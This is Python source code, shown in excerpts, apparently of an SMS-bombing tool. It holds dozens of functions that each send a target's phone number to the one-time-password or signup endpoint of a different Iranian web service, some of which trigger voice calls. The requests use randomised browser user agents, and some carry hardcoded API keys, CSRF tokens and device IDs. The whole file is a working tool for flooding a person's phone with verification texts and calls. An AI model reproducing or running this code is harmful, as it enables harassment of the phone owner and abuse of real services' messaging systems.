...
def snap(phone):
    ...
    try:
        post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
        return True
    except:
        pass
...
def tap30(phone):
    ...
    try:
        post(timeout=5, url="https://tap33.me/api/v2/user",  headers=tap30H, json=tap30D).json()
        return True
    except:
        pass
...
def divar(phone):
    ...
    try:
        post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate",  headers=divarH, json=divarD).json()
        return True
    except:
        pass
...
def snapfood(phone):
    ...
    try:
        post(timeout=5, url=sfoodU,  headers=sfoodH, data=sfoodD).json()
        return True
    except:
        pass
...
def alibaba(phone):
    ...
    try:
        post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp',    headers=alibabaH, json=alibabaD).json()
        return True
    except:
        pass
...
def smarket(phone):
    ...
    try:
        post(timeout=5, url=smarketU, headers=smarketH).json()
        return True
    except:
        pass
...
def sTrip(phone):
    ...
    try:
        post(timeout=5, url='https://www.snapptrip.com/register',  headers=sTripH, json=sTripD).json()
        return True
    except:
        pass
...
def filmnet(phone):
    ...
    try:
        get(timeout=5, url=fnU, headers=fNh).json()
        return True
    except:
        pass
...
def drdr(phone):
    ...
    try:
        post(timeout=5, url=dru, headers=drh, params={"phoneNumber": phone, "userType": "PATIENT"}).json()
        return True
    except:
        pass
...
def banimode(phone):
    ...
    try:
        post(timeout=5, url=bnU, headers=bnH, json=bnJ).json()
        return True
    except:
        pass
...
def chamedoon(phone):
    ...
    try:
        post(timeout=5, url=chU, headers=chH, json=chJ).json()
        return True
    except:
        pass
...
def kilid(phone):
    ...
    try:
        post(timeout=5, url=kiU, headers=kiH, json=kiJ).json()
        return True
    except:
        pass
...
def itoll(phone):
    ...
    try:
        post(timeout=5, url=itU, headers=itH, json=itJ).json()
        return True
    except:
        pass
...
def gap(phone):
    ...
    try:
        get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
        return True
    except:
        pass
...
def sheypoor(phone):
    ...
    try:
        post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD).json()
        return True
    except:
        pass
...
def okorosh(phone):
    ...
    try:
        post(timeout=5, url=okU, headers=okH, json=okJ).text
        return True
    except:
        pass
...
def gapfilm(phone):
    ...
    try:
        post(timeout=5, url=gaU, headers=gaH, json=gaJ).json()
        return True
    except:
        pass
...
def anar(phone):
    ...
    try:
        post(timeout=5, url=anrU, headers=anrH, json=anrJ).json()
        return True
    except:
        pass
...
def azki(phone):
    ...
    try:
        post(timeout=5, url=azkU, headers=azkH).json()
        return True
    except:
        pass
...
def nobat(phone):
    ...
    try:
        post(timeout=5, url=noU, headers=noH, json=noJ).json()
        return True
    except:
        pass
...
def lendo(phone):
    ...
    try:
        post(timeout=5, url=leU, headers=leH, data=leD).text
        return True
    except:
        pass
...
def olgoo(phone):
    ...
    try:
        post(timeout=5, url=olU, headers=olH, data=olD).text
        return True
    except:
        pass
...
def pakhsh(phone):
    ...
    try:
        post(timeout=5, url=paU, headers=paH, data=paD).json()
        return True
    except:
        pass
...
def baskol(phone):
    ...
    try:
        post(timeout=5, url=baU, headers=baH, json=baJ).json()
        return True
    except:
        pass
...
def basalam(phone):
    ...
    try:
        post(timeout=5, url=baU, headers=baH, json=baJ)
        return True
    except:
        pass
...
def see5(phone):
    ...
    try:
        post(timeout=5, url=seU, headers=seH, data=seD).text
        return True
    except:
        pass
...
def ghabzino(phone):
    ...
    try:
        get(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        return True
    except:
        pass
...
def simkhanF(phone):
    ...
    try:
        post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        return True
    except:
        pass
...
def drsaina(phone):
    ...
    try:
        post(timeout=5, url=ghU, headers=ghH, data=ghD).text
        return True
    except:
        pass
...
def limome(phone):
    ...
    try:
        post(timeout=5, url=liU, headers=liH, data=liD).json()
        return True
    except:
        pass
...
def bimito(phone):
    ...
    try:
        post(timeout=5, url=liU, headers=liH).json()
        return True
    except:
        pass
...
def mek(phone):
    ...
    try:
        post(url=meU, headers=meH, data=meD).json()
        return True
    except:
        pass
...
def hyperjan(phone):
    ...
    try:
        post(timeout=5, url="https://shop.hyperjan.ir/api/users/manage", json=snapD, headers=rhead)
        return True
    except:
        pass
...
def digikala(phone):
    ...
    try:
        post(timeout=5, url="https://api.digikala.com/v1/user/authenticate/", data=n4, headers=rhead)
        return True
    except:
        pass
...
def devslop(phone):
    ...
    try:
        post(timeout=5, url="https://i.devslop.app/app/ifollow/api/otp.php", headers=headers, data=n4)
        return True
    except:
        pass
...
def hiword(phone):
    ...
    try:
        post(timeout=5, url="https://hiword.ir/wp-json/otp-login/v1/login", data=n4, headers=rhead)
        return True
    except:
        pass
...
def abantether(phone):
    ...
    try:
        post(timeout=5, url="https://abantether.com/users/register/phone/send/", data=n4, headers=rhead)
        return True
    except:
        pass
...
def bit24(phone):
    ...
    try:
        post(timeout=5, url="https://api.bit24.cash/api/v3/auth/check-mobile", data=n4, headers=rhead)
        return True
    except:
        pass
...
def dicardo(phone):
    ...
    try:
        post(timeout=5, url="https://dicardo.com/main/sendsms", data=n4, headers=rhead)
        return True
    except:
        pass
...
def ghasedak24(phone):
    ...
    n4 = {"username": "0"+phone.split("+98")[1]}
    try:
        post(timeout=5, url="https://ghasedak24.com/user/ajax_register", data=n4, headers=rhead)
        return True
    except:
        pass
...
def tikban(phone):
    ...
    try:
        post(timeout=5, url="https://tikban.com/Account/LoginAndRegister", data=n4, headers=rhead)
        return True
    except:
        pass
...
def digistyle(phone):
    ...
    try:
        post(timeout=5, url="https://www.digistyle.com/users/login-register/", data=n4, headers=rhead)
        return True
    except:
        pass
...
def banankala(phone):
    ...
    n4 = {"Mobile": "0"+phone.split("+98")[1]}
    try:
        post(timeout=5, url="https://banankala.com/home/login", data=n4, headers=rhead)
        return True
    except:
        pass
...
def iranketab(phone):
    ...
    n4 = {"UserName": "0"+phone.split("+98")[1]}
    try:
        post(timeout=5, url="https://www.iranketab.ir/account/register", data=n4, headers=rhead)
        return True
    except:
        pass
...
def ketabchi(phone):
    ...
    n4 = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        post(timeout=5, url="https://ketabchi.com/api/v1/auth/requestVerificationCode", data=n4, headers=rhead)
        return True
    except:
        pass
...
def tapsi(phone):
    ...
    n5 = phone.split("+98")[1]
    try:
        post(timeout=5, url=f"https://join.tapsi.ir/smsConfirm?phoneNumber=0{n5}", headers=rhead)
        return True
    except:
        pass
...
def offdecor(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://www.offdecor.com/index.php?route=account/login/sendCode", data=n4, headers=rhead)
        return True
    except:
        pass
...
def exo(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://exo.ir/index.php?route=account/mobile_login", data=n4, headers=rhead)
        return True
    except:
        pass
...
def shahrfarsh(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://shahrfarsh.com/Account/Login", data=n4, headers=rhead)
        return True
    except:
        pass
...
def takfarsh(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", data=n4, headers=rhead)
        return True
    except:
        pass
...
def beheshticarpet(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://shop.beheshticarpet.com/my-account/", data=n4, headers=rhead)
        return True
    except:
        pass
...
def khanoumi(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://www.khanoumi.com/accounts/sendotp", data=n4, headers=rhead)
        return True
    except:
        pass
...
def rojashop(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://rojashop.com/api/auth/sendOtp", data=n4, headers=rhead)
        return True
    except:
        pass
...
def dadpardaz(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://dadpardaz.com/advice/getLoginConfirmationCode", data=n4, headers=rhead)
        return True
    except:
        pass
...
def rokla(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://api.rokla.ir/api/request/otp", data=n4, headers=rhead)
        return True
    except:
        pass
...
def khodro45(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://khodro45.com/api/v1/customers/otp/", data=n4, headers=rhead)
        return True
    except:
        pass
...
def mashinbank(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://mashinbank.com/api2/users/check", data=n4, headers=rhead)
        return True
    except:
        pass
...
def pezeshket(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://api.pezeshket.com/core/v1/auth/requestCode", data=n4, headers=rhead)
        return True
    except:
        pass
...
def virgool(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://virgool.io/api/v1.4/auth/verify", data=n4, headers=rhead)
        return True
    except:
        pass
...
def timcheh(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://api.timcheh.com/auth/otp/send", data=n4, headers=rhead)
        return True
    except:
        pass
...
def helsa(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url=f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber=0{n5}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain=", headers=rhead)
        return True
    except:
        pass
...
def paklean(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://client.api.paklean.com/user/resendCode", json=n4, headers=rhead)
        return True
    except:
        pass
...
def paklean_call(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)
        return True
    except:
        pass
...
def mobogift(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://mobogift.com/signin", data=n4, headers=rhead)
        return True
    except:
        pass
...
def iranicard(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://api.iranicard.ir/api/v1/register", data=n4, headers=rhead)
        return True
    except:
        pass
...
def pubgsell(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://pubg-sell.ir/loginuser?username=0{n5}", headers=rhead)
        return True
    except:
        pass
...
def tj8(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://tj8.ir/auth/register", data=n4, headers=rhead)
        return True
    except:
        pass
...
def cinematicket(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://cinematicket.org/api/v1/users/signup", data=n4, headers=rhead)
        return True
    except:
        pass
...
def irantic(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://www.irantic.com/api/login/request", data=n4, headers=rhead)
        return True
    except:
        pass
...
def kafegheymat(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://kafegheymat.com/shop/getLoginSms", data=n4, headers=rhead)
        return True
    except:
        pass
...
def express(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", data=n4, headers=rhead)
        return True
    except:
        pass
...
def delino(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://www.delino.com/user/register", data=n4, headers=rhead)
        return True
    except:
        pass
...
def alopeyk(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://alopeyk.com/api/sms/send.php", data=n4, headers=rhead)
        return True
    except:
        pass
...
def tamland(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://1401api.tamland.ir/api/user/signup", data=n4, headers=rhead)
        return True
    except:
        pass
...
def opco(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", data=n4, headers=rhead)
        return True
    except:
        pass
...
def digikalajet(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://api.digikalajet.ir/user/login-register/", data=n4, headers=rhead)
        return True
    except:
        pass
...
def melix(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://melix.shop/site/api/v1/user/otp", json=n4, headers=rhead)
        return True
    except:
        pass
...
def safiran(phone):
    ...
    rhead = {"user-agent": generate_user_agent()}
    try:
        post(timeout=5, url="https://safiran.shop/login", json=n4, headers=rhead)
        return True
    except:
        pass
...
'Origin': 'https://pirankalaco.ir',
'Referer': 'https://pirankalaco.ir/shop/login.php',
...
'Origin': 'https://hamlex.ir',
'Referer': 'https://hamlex.ir/register.php',
...
'Content-Length': '18',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Origin': 'https://irwco.ir',
'Referer': 'https://irwco.ir/register',
'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'Sec-Ch-Ua-Mobile': '?0',
'Sec-Ch-Ua-Platform': 'Windows',
'Sec-Fetch-Dest': 'empty',
...
'Sec-Fetch-Site': 'same-origin',
'User-Agent': generate_user_agent(os="win"),
'X-Requested-Rith': 'XMLHttpRequest'}
    try: 
...
'Content-Length': '32',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Origin': 'https://moshaveran724.ir',
'Referer': 'https://moshaveran724.ir/user/register/',
'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'Sec-Ch-Ua-Mobile': '?0',
'Sec-Ch-Ua-Platform': 'Windows',
'Sec-Fetch-Dest': 'empty',
...
def sibbank(phone):
    n4 = {"phone_number": "0" + phone.split("+98")[1]}
    h4 = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
...
'content-length': '248',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'origin': 'https://steelalborz.com',
'referer': 'https://steelalborz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fsteelalborz.com%2F',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'content-length': '44',
'content-type': 'application/json',
'device-id': '572a5145-d472-430a-9614-b258232873e6',
...
'content-length': '143',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'origin': 'https://www.chaymarket.com',
'referer': 'https://www.chaymarket.com/user/my-account/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'content-length': '248',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'origin': 'https://coffefastfoodluxury.ir',
'referer': 'https://coffefastfoodluxury.ir/product-category/coffeshop/?login=true&page=1&redirect_to=https%3A%2F%2Fcoffefastfoodluxury.ir%2Fproduct-category%2Fcoffeshop%2F',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'host': 'api.dadhesab.ir',
'origin': 'https://app.dadhesab.com',
'referer': 'https://app.dadhesab.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'devicetype': 'Windows',
'f-lang': 'fa',
'f-ses-id': 'ef807c51-7078-4711-81d5-c17b910c6fe5',
'origin': 'https://app.flightio.com',
'referer': 'https://app.flightio.com/profile/editprofile',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'content-length': '23',
'content-type': 'application/json',
'origin': 'https://pwa.mci.ir',
'referer': 'https://pwa.mci.ir/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
def hamrahbours(phone):
    n4 = {"MobileNumber":"0"+phone.split('+98')[1]}
    rhead = {'accept': 'application/json',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'ApiKey': '66a03e8e-fbc5-4b10-bdde-24c52488eb8bd6479050b',
'authorization': 'Bearer undefined',
'connection': 'keep-alive',
'content-length': '30',
'content-type': 'application/json',
'host': 'api.hbbs.ir',
'origin': 'https://app.hbbs.ir',
'referer': 'https://app.hbbs.ir/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'content-type': 'application/json',
'host': 'api.podro.com',
'origin': 'https://shop.podro.com',
'referer': 'https://shop.podro.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'language': 'fa',
'origin': 'https://app.rayshomar.ir',
'os-type': 'webapp',
'referer': 'https://app.rayshomar.ir/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'content-length': '61',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'origin': 'https://refahtea.ir',
'referer': 'https://refahtea.ir/register/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Windows',
'sec-fetch-dest': 'empty',
...
'sec-fetch-site': 'same-origin',
'user-agent': generate_user_agent(os="win"),
'x-csrf-token': 'oREBtfHBdXTuDytkhWwjwSY4gtWHnCJEfbBmAaPN',
'x-requested-with': 'XMLHttpRequest'}
    try: 
        post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        return True
